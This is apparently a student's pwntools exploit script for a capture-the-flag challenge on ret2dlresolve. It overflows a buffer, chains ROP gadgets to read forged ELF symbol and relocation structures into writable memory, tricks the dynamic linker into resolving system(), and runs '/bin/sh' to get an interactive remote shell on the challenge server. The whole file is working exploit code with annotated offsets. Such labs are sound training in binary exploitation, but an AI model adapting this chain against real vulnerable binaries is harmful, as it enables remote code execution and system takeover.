from pwn import *

binary = 'chal.bin'

context.terminal = ["tmux", "splitw", "-v"]
e = context.binary = ELF(binary)
r = ROP(e)

p = remote("cse4850-ret2dlresolve-1.chals.io", 443, ssl=True, sni="cse4850-ret2dlresolve-1.chals.io")

# gadgets we'll use in our exploit
pop_r10 = (r.find_gadget(['pop r10', 'ret']))[0]
mv_rdi = 0x401190
ret = (r.find_gadget(['ret']))[0]

init_plt = 0x401020

# readelf --sections ./chal.bin | egrep "Name|.rela.plt|.dynsym|.dynstr"
#   [Nr] Name              Type             Address           Offset
#   [ 6] .dynsym           DYNSYM           00000000004003d0  000003d0
#   [ 7] .dynstr           STRTAB           00000000004004a8  000004a8
#   [11] .rela.plt         RELA             00000000004005d0  000005d0


# existing structures in the binary
symbtab          = 0x4003d0
strtab           = 0x4004a8
jmp_rel          = 0x4005d0

# location of our fake symtab, rel structures and args
writeable_mem    = 0x404e10 # look at OCs resources
fake_strtab      = writeable_mem
fake_symbtab     = writeable_mem + 0x18
fake_rel         = writeable_mem + 0x38
fake_args        = writeable_mem + 0x50

# calculated fields for our fake structs
dl_resolve_index = int((fake_rel-jmp_rel)/24)
r_info           = int((fake_symbtab - symbtab) / 0x18) << 32 | 0x7
st_shndex        = fake_strtab - strtab


# read the payload into writeable mem 
chain = cyclic(16)                 # padding
chain += p64(ret)                  # ret (align stack)

chain += p64(pop_r10)              # pop r10, ret

chain += p64(writeable_mem)       
chain += p64(mv_rdi)

chain += p64(e.plt['gets'])        # plt.get


# pop the address of args into r10, mv to rdi  call init_plt
chain += p64(pop_r10)              # pop rdi, ret
chain += p64(fake_args)            
chain += p64(mv_rdi)
chain += p64(init_plt)	           # init_plt
chain += p64(dl_resolve_index)     # 0x310 (fake_rel - jmp_rel)/size of rel struct

p.sendline(chain)

# Symbol Name
payload = b'system\x00\x00'	   # st_name (symbol name)
payload += p64(0)                  # st_info (symbol type and handling)
payload += p64(0)                  # st_other (symbol visibiliyt)


# Elf64 Symbol Struct
payload += p64(st_shndex)          # st_shndex (section index) (?)
payload += p64(0)                  # st_value (symbol value)
payload += p64(0)                  # st_size (symbol size)
payload += p64(0)                  # padding



# Elf64_Rel Struct
payload += p64(writeable_mem)      # r_offset (address)
payload += p64(r_info)             # r_info   (reloc type and index) (?)
payload += p64(0)                  # padding

# Arguments
payload += b'/bin/sh\0'            # /bin/sh

print(payload)

p.sendline(payload)
p.interactive()
